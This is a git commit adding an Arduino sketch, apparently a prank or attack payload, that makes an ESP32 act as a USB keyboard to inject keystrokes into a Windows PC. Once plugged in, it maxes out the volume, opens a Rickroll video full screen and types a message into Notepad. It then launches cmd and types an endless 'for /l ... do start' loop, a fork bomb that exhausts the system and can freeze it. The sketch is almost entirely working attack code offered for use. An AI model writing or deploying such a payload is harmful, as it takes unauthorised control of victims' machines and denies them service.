4d29e9ac483bd8bb81921d8e3c422a280aaff442
itsnabih <164906712+itsnabih@users.noreply.github.com>
2025-09-24 17:41:25 +0700

    add: source esp32TinyBomb.ino

---
+++ esp32TinyBomb.ino
@@ -0,0 +1,56 @@
+#include "USB.h"
+#include "USBHIDKeyboard.h"
+
+USBHIDKeyboard Keyboard;
+USBHID HID;
+#define KEY_UP     0x52
+#define KEY_DOWN   0x51
+#define KEY_LEFT   0x50
+#define KEY_RIGHT  0x4F
+
+void setup() {
+  USB.begin();
+  HID.begin();
+  Keyboard.begin();
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI); // Win + R
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(3000);
+  Keyboard.println("sndvol");
+  delay(2000);
+  for (int i=0; i<100; i++) {
+    Keyboard.write(KEY_UP);
+    delay(30);
+  }
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(4000);
+  Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+  delay(5000);
+  Keyboard.write('f'); // fullscreen
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(3000);
+  Keyboard.println("notepad");
+  delay(5000);
+  Keyboard.println("but it will come in handy someday...");
+}
+
+void loop() {
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.println("cmd");
+  delay(2000);
+  Keyboard.println("MODE CON: COLS=15 LINES=1");
+  Keyboard.println("COLOR EF");
+  Keyboard.println(F("for /l %x in (0,0,0) do start"));
+  for(;;) {}
+}
